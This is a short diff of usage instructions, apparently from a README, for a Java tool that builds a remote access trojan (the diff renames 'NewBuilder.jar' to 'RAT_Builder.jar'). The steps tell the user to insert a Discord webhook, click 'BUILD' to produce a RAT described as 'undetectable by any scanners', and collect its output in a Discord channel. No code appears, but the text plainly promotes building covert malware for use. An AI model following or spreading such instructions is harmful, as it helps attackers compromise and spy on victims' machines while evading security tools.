@@ -41,7 +41,7 @@
 #### - Copy webhook url
 
 ### Step 3
-#### - Open NewBuilder.jar
+#### - Open RAT_Builder.jar
 #### - Put ur webhook into opened window
 #### - Click "BUILD" for undetectable rat by any scanners
 #### - Open ur discord server, rat will be in ur webhook channel
